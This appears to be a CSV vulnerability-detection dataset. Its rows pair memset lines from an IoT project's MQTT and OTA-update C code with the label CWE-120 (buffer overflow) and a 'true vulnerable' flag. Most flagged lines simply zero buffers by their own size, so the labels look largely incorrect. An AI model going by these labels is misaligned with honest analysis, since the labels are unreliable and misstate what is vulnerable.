GithubID,Year,FullPath,Codesnippet,CWE,isTrueVulnerable,Codesnippet5
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset((char *)handler->topic_filter, 0, CONFIG_MQTT_TOPIC_MAXLEN);",120,1,"    }

    memset((char *)handler->topic_filter, 0, CONFIG_MQTT_TOPIC_MAXLEN);
#endif
    memcpy((char *)handler->topic_filter, topicFilter, strlen(topicFilter) + 1);
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset((char *)handler->topic_filter, 0, MQTT_ZIP_PATH_DEFAULT_LEN);",120,1,"            return STATE_SYS_DEPEND_MALLOC;
        }
        memset((char *)handler->topic_filter, 0, MQTT_ZIP_PATH_DEFAULT_LEN);
#else
        if (MQTT_ZIP_PATH_DEFAULT_LEN >= CONFIG_MQTT_TOPIC_MAXLEN) {
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(topicString, 0x0, CONFIG_MQTT_TOPIC_MAXLEN);",120,1,"    }

    memset(topicString, 0x0, CONFIG_MQTT_TOPIC_MAXLEN);
    strncpy(topicString, topicName, CONFIG_MQTT_TOPIC_MAXLEN - 1);

"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(&c->list_sub_handle[idx], 0, sizeof(iotx_mc_topic_handle_t));",120,1,"             iotx_mc_is_topic_matched((char *)c->list_sub_handle[idx].topic_filter, &cur_topic))) {
            mqtt_debug(""topic be matched"");
            memset(&c->list_sub_handle[idx], 0, sizeof(iotx_mc_topic_handle_t));
        }
    }
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(node, 0, sizeof(iotx_mc_pub_info_t));",120,1,"            mqtt_free(node);
#else
            memset(node, 0, sizeof(iotx_mc_pub_info_t));
#endif
        }
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(pClient->list_sub_handle, 0, sizeof(iotx_mc_topic_handle_t) * IOTX_MC_SUBHANDLE_LIST_MAX_LEN);",120,1,"    }
#else
    memset(pClient->list_sub_handle, 0, sizeof(iotx_mc_topic_handle_t) * IOTX_MC_SUBHANDLE_LIST_MAX_LEN);
#endif
    amp_mutex_destroy(pClient->lock_generic);
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(pClient, 0, sizeof(iotx_mc_client_t));",120,1,"    mqtt_free(pClient);
#else
    memset(pClient, 0, sizeof(iotx_mc_client_t));
#endif
    *c = NULL;
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(&client->list_sub_sync_ack[idx], 0, sizeof(mqtt_sub_sync_node_t));",120,1,"            for (idx = 0; idx < IOTX_MC_SUBSYNC_LIST_MAX_LEN; idx++) {
                if (client->list_sub_sync_ack[idx].used == 0) {
                    memset(&client->list_sub_sync_ack[idx], 0, sizeof(mqtt_sub_sync_node_t));
                    client->list_sub_sync_ack[idx].used = 1;
                    node = &client->list_sub_sync_ack[idx];
"
2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,"memset(preauth_out, 0, sizeof(iotx_sign_mqtt_t));",120,1,"    int res;

    memset(preauth_out, 0, sizeof(iotx_sign_mqtt_t));

    /* setup device_id */
"
2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,"memset(&g_internal_sign, 0, sizeof(iotx_sign_mqtt_t));",120,1,"
    /* init g_internal_sign */
    memset(&g_internal_sign, 0, sizeof(iotx_sign_mqtt_t));

    /* get meta_info from hal */
"
2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,"memset(&meta_info_interal, 0, sizeof(iotx_dev_meta_info_t));",120,1,"
    /* get meta_info from hal */
    memset(&meta_info_interal, 0, sizeof(iotx_dev_meta_info_t));
    memcpy(&meta_info_interal, &meta_info, sizeof(iotx_dev_meta_info_t));

"
2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,"memset(&tmp_sign, 0, sizeof(iotx_sign_mqtt_t));",120,1,"    {
        iotx_sign_mqtt_t tmp_sign;
        memset(&tmp_sign, 0, sizeof(iotx_sign_mqtt_t));

        ret = IOT_Sign_MQTT(region, &meta_info_interal, &tmp_sign);
"
2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,"memset(&mqtt_params, 0x0, sizeof(iotx_mqtt_param_t));",120,1,"
    /* Initialize MQTT parameter */
    memset(&mqtt_params, 0x0, sizeof(iotx_mqtt_param_t));

    {
"
2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,"memset(&meta_info, 0, sizeof(iotx_dev_meta_info_t));",120,1,"
    /* get meta_info from hal */
    memset(&meta_info, 0, sizeof(iotx_dev_meta_info_t));
    IOT_Ioctl(IOTX_IOCTL_GET_PRODUCT_KEY, meta_info.product_key);
    IOT_Ioctl(IOTX_IOCTL_GET_DEVICE_NAME, meta_info.device_name);
"
2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,"memset(iotx_ca_crt_itls, 0, sizeof(iotx_ca_crt_itls));",120,1,"            mqtt_params.pub_key = iotx_ca_crt;
        } else {
            memset(iotx_ca_crt_itls, 0, sizeof(iotx_ca_crt_itls));
            IOT_Ioctl(IOTX_IOCTL_GET_PRODUCT_KEY, iotx_ca_crt_itls);
            IOT_Ioctl(IOTX_IOCTL_GET_PRODUCT_SECRET, iotx_ca_crt_itls + strlen(iotx_ca_crt_itls) + 1);
"
2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,"memset(&mqtt_msg, 0x0, sizeof(iotx_mqtt_topic_info_t));",120,1,"    }

    memset(&mqtt_msg, 0x0, sizeof(iotx_mqtt_topic_info_t));

    mqtt_msg.qos         = qos;
"
2021\haas-mini-program\components\ota\hal\ota_hal_ctrl.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_ctrl.c,"memset(hash, 0x00, sizeof(hash));",120,1,"         param->upg_flag = upg_flag;
    }
    memset(hash, 0x00, sizeof(hash)); 
    ret = ota_hash_final(&hash_ctx, hash);
    if(ret == 0) {
"
2021\haas-mini-program\components\ota\hal\ota_hal_digest.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_digest.c,"memset(ctx, 0, sizeof(ota_sha256_context));",120,1,"        ota_free(ctx->ali_ctx);
    }
    memset(ctx, 0, sizeof(ota_sha256_context));
#endif
}
"
2021\haas-mini-program\components\ota\hal\ota_hal_digest.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_digest.c,"memset(ctx->ali_ctx, 0, ctx_size);",120,1,"            OTA_LOG_I(""mbedtls_calloc(%d) fail\n"", (int)ctx_size);
        } else {
            memset(ctx->ali_ctx, 0, ctx_size);
        }
    }
"
2021\haas-mini-program\components\ota\hal\ota_hal_digest.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_digest.c,"memset(ctx, 0, sizeof(ota_md5_context));",120,1,"        ota_free(ctx->ali_ctx);
    }
    memset(ctx, 0, sizeof(ota_md5_context));
#endif
}
"
2021\haas-mini-program\components\ota\hal\ota_hal_fs_plat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_fs_plat.c,"memset(store_file_name, 0x00, sizeof(store_file_name));",120,1,"    OTA_LOG_I(""subdev_name = %s, iamge_len = %d, ver = %s\n"",
             tmp_ctx->dn, size, ver);
    memset(store_file_name, 0x00, sizeof(store_file_name));
    ret = ota_get_storefile_subdev_name(store_file_name);
    printf(""ret = %d, file_name = %s\r\n"", ret, store_file_name);
"
2021\haas-mini-program\components\ota\hal\ota_hal_fs_plat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_fs_plat.c,"memset(upack_path, 0x00,sizeof(upack_path));",120,1,"    if(version != NULL) {
        ret = 0;
        memset(upack_path, 0x00,sizeof(upack_path));
        amp_get_user_dir(upack_path);
        upack_path_len = strlen(upack_path);
"
2021\haas-mini-program\components\ota\hal\ota_hal_fs_plat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_fs_plat.c,"memset(read_buf, 0x00, sizeof(read_buf));",120,1,"        }
        else {
            memset(read_buf, 0x00, sizeof(read_buf));
            read_len = ota_fread(read_buf, 1, sizeof(read_buf) - 1, fptr);
            if(read_len > 13) {
"
2021\haas-mini-program\components\ota\hal\ota_hal_os.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_os.c,"memset(dest_buf, 0x00, dest_len);",120,1,"    if((dest_buf != NULL) && (src_buf != NULL) && (dest_len > 2 * src_len)) {
        ret = 0;
        memset(dest_buf, 0x00, dest_len);
        for (i = 0; i < src_len; i++) {
           ota_snprintf(dest_buf + i * 2, 2 + 1, ""%02X"", src_buf[i]);
"
2021\haas-mini-program\components\ota\hal\ota_hal_param.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_param.c,"memset(&param, 0, sizeof(ota_boot_param_t));",120,1,"    int ret = 0;
    ota_boot_param_t param = {0};
    memset(&param, 0, sizeof(ota_boot_param_t));
    ret = ota_read_parameter(&param);
    if(ret < 0) {
"
2021\haas-mini-program\components\ota\hal\ota_hal_param.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_param.c,"memset(ota_param, 0, sizeof(ota_boot_param_t));",120,1,"        return ret;
    }
    memset(ota_param, 0, sizeof(ota_boot_param_t));
    ret = amp_hal_flash_read(param_part, &offset, ota_param, sizeof(ota_boot_param_t));
    if(ret < 0) {
"
2021\haas-mini-program\components\ota\hal\ota_hal_param.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_param.c,"memset(&comp_buf, 0, len);",120,1,"    ota_param->param_crc = ota_get_data_crc16((const unsigned char *)ota_param, sizeof(ota_boot_param_t) - sizeof(unsigned short));
    OTA_LOG_I(""ota update param crc:0x%04x flag:0x%04x \n"", ota_param->param_crc, ota_param->upg_flag);
    memset(&comp_buf, 0, len);
#if 0
    ret = hal_flash_dis_secure(AMP_PARTITION_ID_PARAMER1, 0, 0);
"
2021\haas-mini-program\components\ota\hal\ota_hal_plat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_plat.c,"memset(p_part_info, 0, sizeof(amp_hal_logic_partition_t));",120,1,"        amp_hal_logic_partition_t *p_part_info;
        p_part_info = &part_info;
        memset(p_part_info, 0, sizeof(amp_hal_logic_partition_t));
        ret = amp_hal_flash_info_get(boot_part, p_part_info);
        if(ret != 0 || param->len == 0) {
"
2021\haas-mini-program\components\ota\hal\ota_hal_plat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_plat.c,"memset(p_ota_info, 0, sizeof(amp_hal_logic_partition_t));",120,1,"    amp_hal_logic_partition_t *p_ota_info = &ota_info;
    amp_hal_logic_partition_t *p_app_info = &app_info;
    memset(p_ota_info, 0, sizeof(amp_hal_logic_partition_t));
    memset(p_app_info, 0, sizeof(amp_hal_logic_partition_t));
    amp_hal_flash_info_get(boot_part, p_ota_info);
"
2021\haas-mini-program\components\ota\hal\ota_hal_plat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_plat.c,"memset(p_app_info, 0, sizeof(amp_hal_logic_partition_t));",120,1,"    amp_hal_logic_partition_t *p_app_info = &app_info;
    memset(p_ota_info, 0, sizeof(amp_hal_logic_partition_t));
    memset(p_app_info, 0, sizeof(amp_hal_logic_partition_t));
    amp_hal_flash_info_get(boot_part, p_ota_info);
    amp_hal_flash_info_get(AMP_PARTITION_APPLICATION, p_app_info);
"
2021\haas-mini-program\components\ota\hal\ota_hal_plat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_plat.c,"memset(tmp_version, 0x00, sizeof(tmp_version));",120,1,"    }
    else {
        memset(tmp_version, 0x00, sizeof(tmp_version));
        if(dn == NULL) {//default module
            amp_app_version_get(tmp_version);
"
2021\haas-mini-program\components\ota\ota_agent\ota_service.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\ota_agent\ota_service.c,"memset(tmp_buf, 0x00, sizeof(tmp_buf));",120,1,"            char tmp_buf[65];
            int result = 0;
            memset(tmp_buf, 0x00, sizeof(tmp_buf));
            memcpy(ota_param.sign, ctx->header.sign_info->signature, sizeof(ota_param.sign));
            ota_param.hash_type = OTA_SHA256;
"
2021\haas-mini-program\components\ota\ota_agent\download\ota_download_file2fs_http.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\ota_agent\download\ota_download_file2fs_http.c,"memset(hdr, 0x00, OTA_HTTP_HEAD_LEN);",120,1,"        return ret;
    }
    memset(hdr, 0x00, OTA_HTTP_HEAD_LEN); 
    fptr = ota_fopen(store_path, ""wb"");
    if(fptr == NULL) {
"
2021\haas-mini-program\components\ota\ota_agent\download\ota_download_file2fs_http.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\ota_agent\download\ota_download_file2fs_http.c,"memset(settings.req_buf, 0, settings.req_buf_size);",120,1,"           goto EXIT;
       }
       memset(settings.req_buf, 0, settings.req_buf_size);
       OTA_LOG_E(""ota download begin....\n"");
       while (ota_file_size == 0 || ota_rx_size < ota_file_size) {
"
2021\haas-mini-program\components\ota\ota_agent\download\ota_download_http.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\ota_agent\download\ota_download_http.c,"memset(settings, 0, sizeof(httpc_connection_t));",120,1,"        return -1;
    }
    memset(settings, 0, sizeof(httpc_connection_t));
    settings->socket = fd;
    settings->server_name = host_name;
"
2021\haas-mini-program\components\ota\ota_agent\download\ota_download_http.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\ota_agent\download\ota_download_http.c,"memset(pkps, 0x00, sizeof(pkps));",120,1,"#if defined OTA_CONFIG_ITLS
    OTA_LOG_I(""init itls ota.\n"");
    memset(pkps, 0x00, sizeof(pkps));
    strncpy(pkps, ctx->pk, strlen(ctx->pk));
    strncpy(pkps + strlen(ctx->pk) + 1, ctx->ps, strlen(ctx->ps));
"
2021\haas-mini-program\components\ota\ota_agent\download\ota_download_http.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\ota_agent\download\ota_download_http.c,"memset(hdr, 0, OTA_HTTP_HEAD_LEN);",120,1,"        return ret;
    }
    memset(hdr, 0, OTA_HTTP_HEAD_LEN);
    ota_download_parse_host_uri(url, host_name, host_uri);
#ifdef OTA_CONFIG_LOCAL_RSA
"
2021\haas-mini-program\components\ota\ota_agent\download\ota_download_http.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\ota_agent\download\ota_download_http.c,"memset(settings.req_buf, 0, OTA_DOWNLOAD_BLOCK_SIZE);",120,1,"           goto OVER;
       }
       memset(settings.req_buf, 0, OTA_DOWNLOAD_BLOCK_SIZE);
       ret = ota_httpc_request_send(httpc_handle, host_uri, hdr, OTA_DOWNLOAD_RETRY_CNT);
       if (ret < 0) {
"
2021\haas-mini-program\components\ota\ota_agent\tools\upack_data_file.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\ota_agent\tools\upack_data_file.c,"memset(tmp_file_name, 0x00, sizeof(tmp_file_name));",120,1,"      (strlen(upack_path) <= 64)) {
       OTA_LOG_E(""upack_path = %d\r\n"", strlen(upack_path));
       memset(tmp_file_name, 0x00, sizeof(tmp_file_name));
       memset(&pack_head, 0x00, sizeof(data_file_pack_head_t));
       memset(&file_info, 0x00, sizeof(data_file_infor_t));
"
2021\haas-mini-program\components\ota\ota_agent\tools\upack_data_file.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\ota_agent\tools\upack_data_file.c,"memset(&pack_head, 0x00, sizeof(data_file_pack_head_t));",120,1,"       OTA_LOG_E(""upack_path = %d\r\n"", strlen(upack_path));
       memset(tmp_file_name, 0x00, sizeof(tmp_file_name));
       memset(&pack_head, 0x00, sizeof(data_file_pack_head_t));
       memset(&file_info, 0x00, sizeof(data_file_infor_t));
       upack_path_len = strlen(upack_path);
"
2021\haas-mini-program\components\ota\ota_agent\tools\upack_data_file.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\ota_agent\tools\upack_data_file.c,"memset(&file_info, 0x00, sizeof(data_file_infor_t));",120,1,"       memset(tmp_file_name, 0x00, sizeof(tmp_file_name));
       memset(&pack_head, 0x00, sizeof(data_file_pack_head_t));
       memset(&file_info, 0x00, sizeof(data_file_infor_t));
       upack_path_len = strlen(upack_path);
       strcpy(tmp_file_name, upack_path);
"
2021\haas-mini-program\components\ota\ota_agent\tools\upack_data_file.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\ota_agent\tools\upack_data_file.c,"memset(&tmp_file_name[upack_path_len], 0x00, sizeof(tmp_file_name) - upack_path_len);",120,1,"                                   }
                               }
                               memset(&tmp_file_name[upack_path_len], 0x00, sizeof(tmp_file_name) - upack_path_len);
                               if(ret == 0) {
                                   ota_fclose(write_fd);
"
